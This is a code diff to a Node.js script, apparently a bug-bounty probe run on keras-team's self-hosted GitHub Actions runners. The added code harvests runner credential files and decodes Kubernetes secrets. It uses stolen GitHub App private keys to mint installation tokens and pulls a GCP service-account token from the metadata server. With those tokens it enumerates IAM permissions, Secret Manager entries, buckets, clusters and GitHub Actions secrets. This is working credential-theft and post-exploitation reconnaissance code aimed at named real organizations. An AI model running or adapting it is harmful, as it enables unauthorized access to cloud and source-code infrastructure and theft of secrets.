@@ -52,15 +52,23 @@ function urlHost(value) {
   }
 }
 
+function caseInsensitive(object, wanted) {
+  const key = Object.keys(object).find(
+    (candidate) => candidate.toLowerCase() === wanted.toLowerCase(),
+  );
+  return key === undefined ? undefined : object[key];
+}
+
 function runnerFiles() {
   const runnerPath = path.join(RUNNER_ROOT, ".runner");
   const credentialsPath = path.join(RUNNER_ROOT, ".credentials");
   const rsaPath = path.join(RUNNER_ROOT, ".credentials_rsaparams");
   const runner = readJson(runnerPath) || {};
   const credentials = readJson(credentialsPath) || {};
+  const credentialData = caseInsensitive(credentials, "data");
   const data =
-    credentials.data && typeof credentials.data === "object"
-      ? credentials.data
+    credentialData && typeof credentialData === "object"
+      ? credentialData
       : {};
   const rsa = readJson(rsaPath) || {};
   const modulus = rsa.Modulus || rsa.modulus;
@@ -84,20 +92,24 @@ function runnerFiles() {
   return {
     runner: {
       file: fileMetadata(runnerPath),
+      field_names: Object.keys(runner).sort(),
       metadata: Object.fromEntries(
         allowedRunnerKeys
-          .filter((key) => key in runner)
-          .map((key) => [key, runner[key]]),
+          .filter((key) => caseInsensitive(runner, key) !== undefined)
+          .map((key) => [key, caseInsensitive(runner, key)]),
       ),
     },
     credentials: {
       file: fileMetadata(credentialsPath),
-      scheme: credentials.scheme || null,
+      field_names: Object.keys(credentials).sort(),
+      scheme: caseInsensitive(credentials, "scheme") || null,
       data_keys: Object.keys(data).sort(),
-      client_id: data.clientId || null,
-      authorization_host: urlHost(data.authorizationUrl),
-      authorization_v2_host: urlHost(data.authorizationUrlV2),
-      oauth_endpoint_host: urlHost(data.oauthEndpointUrl),
+      client_id: caseInsensitive(data, "clientId") || null,
+      authorization_host: urlHost(caseInsensitive(data, "authorizationUrl")),
+      authorization_v2_host: urlHost(
+        caseInsensitive(data, "authorizationUrlV2"),
+      ),
+      oauth_endpoint_host: urlHost(caseInsensitive(data, "oauthEndpointUrl")),
     },
     rsa_parameters: {
       file: fileMetadata(rsaPath),
@@ -177,6 +189,7 @@ function request(options) {
           resolve({
             ok: res.statusCode >= 200 && res.statusCode < 300,
             status: res.statusCode,
+            headers: res.headers,
             text,
             value,
           });
@@ -332,6 +345,409 @@ class KubeClient {
   }
 }
 
+async function apiRequest(url, token, method = "GET", body = null) {
+  const target = new URL(url);
+  const encoded = body === null ? null : Buffer.from(JSON.stringify(body));
+  return request({
+    protocol: target.protocol,
+    hostname: target.hostname,
+    port: target.port || (target.protocol === "https:" ? 443 : 80),
+    requestPath: target.pathname + target.search,
+    method,
+    body: encoded,
+    headers: {
+      Authorization: `Bearer ${token}`,
+      Accept: "application/vnd.github+json, application/json",
+      "Content-Type": "application/json",
+      "User-Agent": "keras-oss-vrp-metadata-probe",
+      ...(encoded ? { "Content-Length": encoded.length } : {}),
+    },
+  });
+}
+
+function responseSummary(response) {
+  return {
+    ok: Boolean(response.ok),
+    status: response.status || null,
+    error: response.error || null,
+  };
+}
+
+async function githubReadAuthority(token) {
+  const base = "https://api.github.com";
+  const [user, repository, runners, runnerGroups, actionSecrets, packages, repos] =
+    await Promise.all([
+      apiRequest(`${base}/user`, token),
+      apiRequest(`${base}/repos/keras-team/keras`, token),
+      apiRequest(`${base}/orgs/keras-team/actions/runners?per_page=1`, token),
+      apiRequest(`${base}/orgs/keras-team/actions/runner-groups?per_page=1`, token),
+      apiRequest(`${base}/repos/keras-team/keras/actions/secrets?per_page=1`, token),
+      apiRequest(`${base}/orgs/keras-team/packages?package_type=container&per_page=1`, token),
+      apiRequest(`${base}/installation/repositories?per_page=100`, token),
+    ]);
+  const repoItems = repos.value && Array.isArray(repos.value.repositories)
+    ? repos.value.repositories
+    : [];
+  const scopeHeader =
+    (user.headers && user.headers["x-oauth-scopes"]) ||
+    (repository.headers && repository.headers["x-oauth-scopes"]) ||
+    "";
+  return {
+    oauth_scopes: String(scopeHeader)
+      .split(",")
+      .map((scope) => scope.trim())
+      .filter(Boolean)
+      .sort(),
+    authenticated_user: user.ok
+      ? {
+          login: user.value.login,
+          id: user.value.id,
+          type: user.value.type,
+          site_admin: Boolean(user.value.site_admin),
+        }
+      : responseSummary(user),
+    keras_repository: repository.ok
+      ? {
+          full_name: repository.value.full_name,
+          visibility: repository.value.visibility,
+          permissions: repository.value.permissions || null,
+        }
+      : responseSummary(repository),
+    organization_runners: {
+      ...responseSummary(runners),
+      total_count: runners.ok ? runners.value.total_count : null,
+    },
+    organization_runner_groups: {
+      ...responseSummary(runnerGroups),
+      total_count: runnerGroups.ok ? runnerGroups.value.total_count : null,
+    },
+    repository_actions_secrets: {
+      ...responseSummary(actionSecrets),
+      total_count: actionSecrets.ok ? actionSecrets.value.total_count : null,
+    },
+    organization_container_packages: {
+      ...responseSummary(packages),
+      returned_count: packages.ok && Array.isArray(packages.value)
+        ? packages.value.length
+        : null,
+    },
+    installation_repositories: {
+      ...responseSummary(repos),
+      total_count: repos.ok ? repos.value.total_count : null,
+      keras_family: repoItems
+        .map((repo) => repo.full_name)
+        .filter((name) =>
+          ["keras-team/keras", "keras-team/keras-hub", "keras-team/keras-rs"].includes(
+            name,
+          ),
+        ),
+    },
+  };
+}
+
+function appJwt(appId, privateKey) {
+  const now = Math.floor(Date.now() / 1000);
+  const encode = (value) =>
+    Buffer.from(JSON.stringify(value)).toString("base64url");
+  const signingInput = `${encode({ alg: "RS256", typ: "JWT" })}.${encode({
+    iat: now - 60,
+    exp: now + 540,
+    iss: String(appId),
+  })}`;
+  const signature = crypto
+    .sign("RSA-SHA256", Buffer.from(signingInput), privateKey)
+    .toString("base64url");
+  return `${signingInput}.${signature}`;
+}
+
+function decodedSecret(secret) {
+  const values = {};
+  for (const [key, value] of Object.entries(secret.data || {})) {
+    try {
+      values[key] = Buffer.from(value, "base64").toString("utf8");
+    } catch {}
+  }
+  return values;
+}
+
+async function analyzeGithubSecret(secret) {
+  const values = decodedSecret(secret);
+  const keys = Object.keys(values).sort();
+  const base = "https://api.github.com";
+  if (values.github_token) {
+    return {
+      secret_name: secret.metadata.name,
+      mode: "github_token",
+      data_keys: keys,
+      token_value_returned: false,
+      authority: await githubReadAuthority(values.github_token),
+    };
+  }
+  const appKeys = [
+    "github_app_id",
+    "github_app_installation_id",
+    "github_app_private_key",
+  ];
+  if (!appKeys.every((key) => values[key])) return null;
+  let jwt;
+  try {
+    jwt = appJwt(values.github_app_id, values.github_app_private_key);
+  } catch (error) {
+    return {
+      secret_name: secret.metadata.name,
+      mode: "github_app",
+      data_keys: keys,
+      error: error.code || error.name,
+      credential_values_returned: false,
+    };
+  }
+  const app = await apiRequest(`${base}/app`, jwt);
+  const installation = await apiRequest(
+    `${base}/app/installations/${encodeURIComponent(values.github_app_installation_id)}`,
+    jwt,
+  );
+  const result = {
+    secret_name: secret.metadata.name,
+    mode: "github_app",
+    data_keys: keys,
+    credential_values_returned: false,
+    app: app.ok
+      ? {
+          id: app.value.id,
+          slug: app.value.slug,
+          owner: app.value.owner && app.value.owner.login,
+          permissions: app.value.permissions || {},
+          events: app.value.events || [],
+        }
+      : responseSummary(app),
+    installation: installation.ok
+      ? {
+          id: installation.value.id,
+          account: installation.value.account && installation.value.account.login,
+          target_type: installation.value.target_type,
+          repository_selection: installation.value.repository_selection,
+          permissions: installation.value.permissions || {},
+          events: installation.value.events || [],
+          suspended: Boolean(installation.value.suspended_at),
+        }
+      : responseSummary(installation),
+  };
+  const minted = await apiRequest(
+    `${base}/app/installations/${encodeURIComponent(values.github_app_installation_id)}/access_tokens`,
+    jwt,
+    "POST",
+    {},
+  );
+  result.installation_token = {
+    ...responseSummary(minted),
+    minted: Boolean(minted.ok && minted.value && minted.value.token),
+    expires_at: minted.ok ? minted.value.expires_at : null,
+    permissions: minted.ok ? minted.value.permissions || {} : {},
+    repository_selection: minted.ok ? minted.value.repository_selection || null : null,
+    token_value_returned: false,
+  };
+  if (result.installation_token.minted) {
+    result.authority = await githubReadAuthority(minted.value.token);
+  }
+  return result;
+}
+
+async function classifySecrets(client, namespace) {
+  const quoted = encodeURIComponent(namespace);
+  const response = await client.call(
+    "GET",
+    `/api/v1/namespaces/${quoted}/secrets`,
+  );
+  if (!response.ok || !response.value || !Array.isArray(response.value.items)) {
+    return { ...responseSummary(response), secret_values_returned: false };
+  }
+  const inventory = response.value.items.map((secret) => ({
+    name: secret.metadata && secret.metadata.name,
+    type: secret.type || null,
+    data_keys: Object.keys(secret.data || {}).sort(),
+    owner_kinds: Array.isArray(secret.metadata && secret.metadata.ownerReferences)
+      ? secret.metadata.ownerReferences.map((owner) => owner.kind).sort()
+      : [],
+  }));
+  const githubCredentials = [];
+  for (const secret of response.value.items) {
+    const analyzed = await analyzeGithubSecret(secret);
+    if (analyzed) githubCredentials.push(analyzed);
+  }
+  return {
+    ok: true,
+    inventory,
+    github_credentials: githubCredentials,
+    secret_values_returned: false,
+    secret_value_hashes_returned: false,
+  };
+}
+
+async function gcpAuthority(projectId) {
+  const tokenResponse = await request({
+    protocol: "http:",
+    hostname: "metadata.google.internal",
+    port: 80,
+    requestPath: "/computeMetadata/v1/instance/service-accounts/default/token",
+    method: "GET",
+    timeout: 5000,
+    headers: { "Metadata-Flavor": "Google" },
+  });
+  const accessToken = tokenResponse.value && tokenResponse.value.access_token;
+  if (!tokenResponse.ok || !accessToken) {
+    return {
+      token_obtained_in_process: false,
+      token_value_returned: false,
+      token_request: responseSummary(tokenResponse),
+    };
+  }
+  const tokenInfoUrl = new URL("https://oauth2.googleapis.com/tokeninfo");
+  tokenInfoUrl.searchParams.set("access_token", accessToken);
+  const tokenInfo = await apiRequest(tokenInfoUrl.toString(), accessToken);
+  const projectPermissions = [
+    "resourcemanager.projects.get",
+    "resourcemanager.projects.getIamPolicy",
+    "resourcemanager.projects.setIamPolicy",
+    "resourcemanager.projects.update",
+    "resourcemanager.projects.delete",
+    "iam.serviceAccounts.list",
+    "iam.serviceAccounts.get",
+    "iam.serviceAccounts.actAs",
+    "iam.serviceAccounts.getAccessToken",
+    "iam.serviceAccounts.signBlob",
+    "iam.serviceAccounts.signJwt",
+    "iam.serviceAccounts.setIamPolicy",
+    "serviceusage.services.use",
+    "serviceusage.services.enable",
+    "secretmanager.secrets.list",
+    "secretmanager.secrets.get",
+    "secretmanager.secrets.create",
+    "secretmanager.secrets.getIamPolicy",
+    "secretmanager.secrets.setIamPolicy",
+    "secretmanager.versions.access",
+    "secretmanager.versions.add",
+    "storage.buckets.list",
+    "storage.buckets.get",
+    "storage.buckets.create",
+    "storage.buckets.setIamPolicy",
+    "storage.objects.list",
+    "storage.objects.get",
+    "storage.objects.create",
+    "storage.objects.delete",
+    "artifactregistry.repositories.list",
+    "artifactregistry.repositories.get",
+    "artifactregistry.repositories.downloadArtifacts",
+    "artifactregistry.repositories.uploadArtifacts",
+    "artifactregistry.packages.list",
+    "pubsub.topics.list",
+    "pubsub.topics.get",
+    "pubsub.topics.publish",
+    "pubsub.topics.create",
+    "cloudbuild.builds.list",
+    "cloudbuild.builds.get",
+    "cloudbuild.builds.create",
+    "run.services.list",
+    "run.services.get",
+    "run.services.create",
+    "run.services.update",
+    "container.clusters.list",
+    "container.clusters.get",
+    "container.clusters.update",
+  ];
+  const projectTest = await apiRequest(
+    `https://cloudresourcemanager.googleapis.com/v1/projects/${encodeURIComponent(projectId)}:testIamPermissions`,
+    accessToken,
+    "POST",
+    { permissions: projectPermissions },
+  );
+  const [serviceAccounts, secrets, repositories, topics, buckets, builds, clusters] =
+    await Promise.all([
+      apiRequest(
+        `https://iam.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/serviceAccounts?pageSize=100`,
+        accessToken,
+      ),
+      apiRequest(
+        `https://secretmanager.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/secrets?pageSize=100`,
+        accessToken,
+      ),
+      apiRequest(
+        `https://artifactregistry.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/locations/-/repositories?pageSize=100`,
+        accessToken,
+      ),
+      apiRequest(
+        `https://pubsub.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/topics?pageSize=100`,
+        accessToken,
+      ),
+      apiRequest(
+        `https://storage.googleapis.com/storage/v1/b?project=${encodeURIComponent(projectId)}&maxResults=100`,
+        accessToken,
+      ),
+      apiRequest(
+        `https://cloudbuild.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/builds?pageSize=1`,
+        accessToken,
+      ),
+      apiRequest(
+        `https://container.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/locations/-/clusters`,
+        accessToken,
+      ),
+    ]);
+  const names = (response, field, mapper) =>
+    response.ok && Array.isArray(response.value[field])
+      ? response.value[field].slice(0, 100).map(mapper).filter(Boolean)
+      : [];
+  return {
+    token_obtained_in_process: true,
+    token_value_returned: false,
+    token_info: tokenInfo.ok
+      ? {
+          email: tokenInfo.value.email || null,
+          audience: tokenInfo.value.aud || tokenInfo.value.audience || null,
+          scope: tokenInfo.value.scope || null,
+          expires_in: tokenInfo.value.expires_in || null,
+        }
+      : responseSummary(tokenInfo),
+    project_test_iam_permissions: projectTest.ok
+      ? (projectTest.value.permissions || []).sort()
+      : responseSummary(projectTest),
+    inventories: {
+      service_accounts: {
+        ...responseSummary(serviceAccounts),
+        names: names(serviceAccounts, "accounts", (item) => item.email),
+      },
+      secret_manager: {
+        ...responseSummary(secrets),
+        names: names(secrets, "secrets", (item) => item.name),
+      },
+      artifact_registry: {
+        ...responseSummary(repositories),
+        repositories: names(repositories, "repositories", (item) => ({
+          name: item.name,
+          format: item.format,
+          mode: item.mode,
+        })),
+      },
+      pubsub: {
+        ...responseSummary(topics),
+        topics: names(topics, "topics", (item) => item.name),
+      },
+      storage: {
+        ...responseSummary(buckets),
+        buckets: names(buckets, "items", (item) => item.name),
+      },
+      cloud_build: {
+        ...responseSummary(builds),
+        returned_count: builds.ok && Array.isArray(builds.value.builds)
+          ? builds.value.builds.length
+          : null,
+      },
+      gke: {
+        ...responseSummary(clusters),
+        cluster_names: names(clusters, "clusters", (item) => item.name),
+      },
+    },
+  };
+}
+
 async function metadataText(metadataPath) {
   const response = await request({
     protocol: "http:",
@@ -351,13 +767,18 @@ async function metadataText(metadataPath) {
 
 async function collect() {
   const output = {
+    phase: "authority-analysis",
     captured_at: new Date().toISOString(),
     safety: {
       credential_values_returned: false,
       credential_hashes_returned: false,
-      cloud_token_requested: false,
+      github_credential_returned: false,
+      cloud_token_requested: true,
+      cloud_token_returned: false,
       cloud_identity_document_requested: false,
-      kubernetes_secret_data_requested: false,
+      kubernetes_secret_data_requested: true,
+      kubernetes_secret_values_returned: false,
+      authentication_token_mint_request_sent: true,
       mutating_request_sent: false,
     },
     process: {
@@ -378,7 +799,7 @@ async function collect() {
     project_id: projectId,
     service_account_email: serviceAccountEmail,
     scopes,
-    access_token_requested: false,
+    access_token_requested: true,
   };
 
   let token;
@@ -449,6 +870,10 @@ async function collect() {
       `/apis/actions.github.com/v1alpha1/namespaces/${quoted}/autoscalingrunnersets`,
     );
   }
+  output.kubernetes.secret_authority = await classifySecrets(client, namespace);
+  output.gcp_authority = projectId
+    ? await gcpAuthority(projectId)
+    : { available: false, reason: "project metadata absent" };
   return output;
 }
 
